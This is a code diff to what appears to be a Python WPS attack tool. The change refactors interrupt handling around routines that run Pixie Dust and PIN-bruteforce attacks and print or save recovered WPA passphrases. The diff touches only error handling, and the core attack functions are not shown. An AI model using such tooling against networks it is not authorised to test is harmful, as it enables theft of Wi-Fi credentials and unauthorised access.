@@ -525,28 +525,23 @@ class Companion(object):
                 pin = self.generator.getLikely(bssid) or '12345670'
             else:
                 pin = self.__prompt_wpspin(bssid) or '12345670'
-        try:
-            self.__wps_connection(bssid, pin, pixiemode)
-            if self.connection_status.status == 'GOT_PSK':
-                self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
-                if self.save_result:
-                    self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-                return True
-            elif pixiemode:
-                if self.pixie_creds.got_all():
-                    pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                    if pin:
-                        return self.single_connection(bssid, pin, pixiemode=False)
-                    return False
-                else:
-                    print('[!] No enough data to run Pixie Dust attack')
-                    return False
-            else:
+        self.__wps_connection(bssid, pin, pixiemode)
+        if self.connection_status.status == 'GOT_PSK':
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            if self.save_result:
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            return True
+        elif pixiemode:
+            if self.pixie_creds.got_all():
+                pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if pin:
+                    return self.single_connection(bssid, pin, pixiemode=False)
                 return False
-        except KeyboardInterrupt:
-            if raise_kbrdinterr:
-                raise KeyboardInterrupt
-            print("\nAborting…")
+            else:
+                print('[!] No enough data to run Pixie Dust attack')
+                return False
+        else:
+            return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         '''
@@ -807,9 +802,6 @@ class WiFiScanner(object):
                     raise IndexError
             except Exception:
                 print('Invalid number')
-            except KeyboardInterrupt:
-                print('\nAborting…')
-                return False
             else:
                 break
 
@@ -936,23 +928,26 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
-    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+    try:
+        companion = Companion(args.interface, args.write, print_debug=args.verbose)
 
-    if not args.bssid:
-        try:
-            with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                vuln_list = file.read().splitlines()
-        except FileNotFoundError:
-            vuln_list = []
-        scanner = WiFiScanner(args.interface, companion, vuln_list)
-        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-        args.bssid = scanner.prompt_network()
+        if not args.bssid:
+            try:
+                with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                    vuln_list = file.read().splitlines()
+            except FileNotFoundError:
+                vuln_list = []
+            scanner = WiFiScanner(args.interface, companion, vuln_list)
+            print('[*] BSSID not specified (--bssid) — scanning for available networks')
+            args.bssid = scanner.prompt_network()
 
-    if args.bssid:
-        if args.bruteforce:
-            companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-        else:
-            companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                        args.show_pixie_cmd, args.pixie_force)
+        if args.bssid:
+            if args.bruteforce:
+                companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+            else:
+                companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                            args.show_pixie_cmd, args.pixie_force)
+    except KeyboardInterrupt:
+        print("\nAborting…")
 
     ifaceUp(args.interface, down=True)
